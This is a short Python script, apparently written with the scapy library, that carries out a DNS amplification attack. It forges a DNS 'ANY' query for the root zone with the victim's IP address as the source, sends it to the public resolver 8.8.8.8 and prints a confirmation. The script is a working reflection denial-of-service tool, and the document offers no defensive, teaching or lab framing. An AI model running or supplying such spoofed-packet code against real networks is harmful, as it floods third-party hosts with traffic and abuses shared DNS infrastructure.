from scapy.all import *

def dns_amplification(target_ip, dns_server):
    
    dns_query = IP(dst=dns_server, src=target_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=".", qtype="ANY"))

    send(dns_query, verbose=0)
    print(f"Sent DNS query to {dns_server} with spoofed source {target_ip}")


target_ip = "192.168.18.2"  
dns_server = "8.8.8.8"       


dns_amplification(target_ip, dns_server)

